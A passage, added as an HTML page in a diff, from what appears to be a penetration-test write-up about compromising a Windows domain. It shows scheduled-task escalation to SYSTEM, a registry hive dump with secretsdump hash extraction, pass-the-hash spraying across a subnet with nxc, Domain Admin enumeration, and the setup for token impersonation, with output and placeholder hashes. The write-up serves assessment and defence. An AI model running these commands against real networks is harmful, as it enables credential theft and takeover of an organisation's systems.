@@ -1,0 +1,133 @@
+bled group
+</code></pre>
+<p>This confirmed that the session had sufficient local privilege to perform system-level actions on <code>SRV-SCCM-01</code>.</p>
+<pre><code></code></pre>
+<h2>Escalating to SYSTEM through task scheduler</h2>
+<p>The administrative session was then used to validate execution as <code>SYSTEM</code>. A scheduled task was created with the <code>SYSTEM</code> principal and configured to write the current security context to a temporary file.</p>
+<pre><code>schtasks /delete /tn sys /f 2&gt;$null
+schtasks /create /tn sys /sc once /st 23:59 /ru SYSTEM /rl HIGHEST /f /tr &quot;cmd.exe /c \&quot;whoami &gt; C:\Users\Public\sys.txt 2&gt;&amp;1\&quot;&quot;
+schtasks /run /tn sys
+Start-Sleep -Seconds 5
+type C:\Users\Public\sys.txt
+</code></pre>
+<p>The output confirmed execution as <code>SYSTEM</code>.</p>
+<pre><code>nt authority\system
+</code></pre>
+<p>This mattered  because several subsequent actions required system-level access. In  particular, registry hive export and token manipulation are not normally  available to a standard remote management session unless the operator  has elevated local privileges.</p>
+<h2>Exporting registry hives for offline hash extraction</h2>
+<p>With <code>SYSTEM</code> execution confirmed, the local <code>SAM</code>, <code>SYSTEM</code>, and <code>SECURITY</code> registry hives were saved to disk.</p>
+<pre><code>reg save HKLM\SAM C:\Users\Public\SAM.save /y
+reg save HKLM\SYSTEM C:\Users\Public\SYSTEM.save /y
+reg save HKLM\SECURITY C:\Users\Public\SECURITY.save /y
+</code></pre>
+<p>The <code>SAM</code> and <code>SYSTEM</code> hives were then downloaded for offline processing.</p>
+<pre><code>download SAM.save
+download SYSTEM.save
+</code></pre>
+<p>The hives were processed offline to extract local account hashes.</p>
+<pre><code>impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
+</code></pre>
+<p>The local Administrator hash was extracted from the SAM database.</p>
+<pre><code>[*] Target system bootKey: 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+[*] Dumping local SAM hashes
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:22222222222222222222222222222222:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:33333333333333333333333333333333:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:33333333333333333333333333333333:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44444444444444444444444444444444:::
+</code></pre>
+<p>This identified a  reusable local Administrator credential. The next question was whether  that local Administrator password was unique to <code>SRV-SCCM-01</code> or reused across other systems.</p>
+<h2>Local Administrator hash reuse across the Internal Subnet</h2>
+<p>The extracted local Administrator hash was tested across the internal subnet using local authentication.</p>
+<pre><code>nxc smb 10.10.20.0/24 --local-auth -u Administrator -H 22222222222222222222222222222222 | tee local_admin_reuse_sanitised.txt
+</code></pre>
+<p>The results showed that the same local Administrator hash was valid across multiple hosts.</p>
+<pre><code>SMB 10.10.20.84 445 SRV-DB-01   [+] SRV-DB-01\Administrator:22222222222222222222222222222222 (Pwn3d!)
+SMB 10.10.20.50 445 SRV-MGMT-01 [+] SRV-MGMT-01\Administrator:22222222222222222222222222222222 (Pwn3d!)
+SMB 10.10.20.54 445 SRV-WEB-01  [+] SRV-WEB-01\Administrator:22222222222222222222222222222222 (Pwn3d!)
+</code></pre>
+<p>This was a key  point in the chain. Local Administrator reuse meant that compromise of  one host exposed administrative access to several others. One of the  affected hosts, <code>SRV-MGMT-01</code>, later provided the route to Domain Admin token impersonation.</p>
+<h2>Establishing Local Administrator access to SRV-MGMT-01</h2>
+<p>Using the reused local Administrator hash, a session was established to <code>SRV-MGMT-01</code>.</p>
+<p>The session confirmed remote PowerShell execution as an administrative user.</p>
+<pre><code>PS C:\Users\Administrator\Documents&gt; whoami
+example-corp\administrator
+</code></pre>
+<p>From this point,  the assessment focused on whether local administrator access to this  management host could be converted into domain-level privilege.</p>
+<h2>Enumerating Domain Admin membership</h2>
+<p>The Domain Admins group was enumerated from the compromised host.</p>
+<pre><code>net group &quot;Domain Admins&quot; /domain
+</code></pre>
+<p>The output identified several privileged accounts, including <code>ADMUSER01</code>.</p>
+<pre><code>Group name Domain Admins
+
+Members
+-------------------------------------------------------------------------------
+ADMUSER02 SCCM_ADMIN01 SCCM_ADMIN02
+SCCM_ADMIN03 HELPDESK02 HELPDESK03
+HELPDESK04 helpdesk05 HELPDESK06
+ITADMIN01 ITADMIN02 ITADMIN03
+ITADMIN04 ITADMIN05 SCCM_ADMIN04
+ADMUSER01 DBADMIN01 SCCM_PUSH01
+svc.example.staff SCCM_ADMIN05
+
+The command completed successfully.
+</code></pre>
+<p>The specific privileged account was then reviewed.</p>
+<pre><code>net user ADMUSER01 /domain
+</code></pre>
+<p>The account was confirmed as a member of high-privilege groups.</p>
+<pre><code>User name ADMUSER01
+Full Name Privileged User
+Account active Yes
+Account expires Never
+Last logon 28/04/2026 20:40:02
+
+Local Group Memberships *Administrators
+Global Group memberships *Enterprise Admins
+                         *Domain Admins
+                         *Schema Admins
+</code></pre>
+<p>This confirmed that <code>ADMUSER01</code>  had domain-wide administrative privileges. The next step was to  determine whether the user had an active session on the compromised  host.</p>
+<h2>Identifying an active Domain Admin session</h2>
+<p>Active sessions on <code>SRV-MGMT-01</code> were enumerated.</p>
+<pre><code>query user
+</code></pre>
+<p>The output showed that <code>ADMUSER01</code> had an active interactive session.</p>
+<pre><code>USERNAME    SESSIONNAME    ID  STATE   IDLE TIME  LOGON TIME
+admuser01   rdp-tcp#5       2   Active  .          28/04/2026 20:35
+administrator              3   Active  .          28/04/2026 20:30
+</code></pre>
+<p>Process enumeration was then used to identify a process running under the privileged user’s context.</p>
+<pre><code>tasklist /v | findstr /i admuser01
+</code></pre>
+<p>A PowerShell process was identified under the Domain Admin user context.</p>
+<pre><code>powershell.exe 24680 Console 2 50,000 K Running EXAMPLE-CORP\admuser01
+</code></pre>
+<p>This was the point  where the local compromise became a domain compromise opportunity. The  privileged user’s password had not been extracted. However, the user’s  active process token was present on a host where local administrative  access had already been obtained.</p>
+<h2>Escalating to SYSTEM on SRV-MGMT-01</h2>
+<p>To access and  duplicate another user’s process token, the session needed to execute  with sufficient local privileges. A scheduled task was created and run  as <code>SYSTEM</code> to validate the escalation path.</p>
+<pre><code>$action = New-ScheduledTaskAction \
+  -Execute &quot;cmd.exe&quot; \
+  -Argument &quot;/c whoami &gt; C:\Windows\Temp\who.txt&quot;
+
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+$principal = New-ScheduledTaskPrincipal -UserId &quot;SYSTEM&quot; -RunLevel Highest
+
+Register-ScheduledTask \
+  -TaskName &quot;tok&quot; \
+  -Action $action \
+  -Trigger $trigger \
+  -Principal $principal \
+  -Force
+
+Start-ScheduledTask -TaskName &quot;tok&quot;
+Start-Sleep 5
+type C:\Windows\Temp\who.txt
+</code></pre>
+<p>The output confirmed execution as <code>SYSTEM</code>.</p>
+<pre><code>nt authority\system
+</code></pre>
+<p>This was required  because the next step involved opening a process owned by the privileged  user, accessing its token, duplicating that token, and spawning a new  process under the duplicated security context.</p>
+<h2>Preparing the Domain Admin proof script</h2>
+<p>A proof script was  written to disk. This script did not perform destructive actions. Its  purpose was to capture the security context and group membership of the  process that would later run under the duplicated toke
